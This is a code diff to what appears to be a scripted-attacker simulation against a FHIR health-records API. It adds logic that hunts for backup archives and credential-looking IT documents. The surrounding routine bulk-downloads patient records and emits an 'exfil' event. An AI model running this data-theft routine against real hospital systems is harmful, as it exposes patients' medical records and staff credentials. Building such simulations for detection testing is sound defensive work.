@@ -77,13 +77,38 @@ def patients(bundle: dict[str, Any]) -> list[dict[str, Any]]:
     return out
 
 
+JSON = {"Accept": "application/json"}
+JUICY = ("research", "linkage", "dump", "svc", "vpn", "credential", "admin", "key")
+
+
+def links(doc: Any, key: str) -> list[str]:
+    """Every value stored under `key` anywhere in a JSON document (portal listings)."""
+    out: list[str] = []
+    if isinstance(doc, dict):
+        for k, v in doc.items():
+            if k == key and isinstance(v, str):
+                out.append(v)
+            else:
+                out += links(v, key)
+    elif isinstance(doc, list):
+        for v in doc:
+            out += links(v, key)
+    return out
+
+
+def juiciest(urls: list[str]) -> str | None:
+    """A scripted attacker's taste: the first link whose name sounds valuable, else the first link."""
+    return next((u for u in urls if any(w in u.lower() for w in JUICY)), urls[0] if urls else None)
+
+
 def attack(c: Client) -> str:
     c.call("GET", "/fhir/Patient?_count=20")                      # ward list: normal for a nurse
     ward = patients(c.last.json()) if c.last.status_code == 200 else []
     if ward:
         c.call("GET", f"/fhir/Patient/{ward[0]['id']}")
     c.call("GET", "/portal/admin/users")                          # reaches for admin
-    c.call("GET", "/portal/backups")                              # looks for backups
+    r = c.call("GET", "/portal/backups", headers=JSON)            # looks for backups
+    archive = juiciest(links(r.json(), "download")) if r.status_code == 200 else None
     stolen: list[dict[str, Any]] = []
     total_bytes = 0
     path: str | None = "/fhir/Patient?_count=1000"
@@ -104,6 +129,12 @@ def attack(c: Client) -> str:
         r = c.call("GET", f"/fhir/DocumentReference?patient={p['id']}")
         if r.status_code == 200:
             total_bytes += len(r.content)
+    r = c.call("GET", "/portal/docs", headers=JSON)               # browses IT documents
+    doc = juiciest(links(r.json(), "view")) if r.status_code == 200 else None
+    if doc:
+        c.call("GET", doc)                                        # opens the most valuable-looking one
+    if archive:
+        c.call("GET", archive)                                    # downloads a backup archive
     if stolen:
         c.emit("exfil", {"records": len(stolen), "bytes": total_bytes,
                          "artifact": f"GET /fhir/Patient ({pages} pages) + DocumentReference",
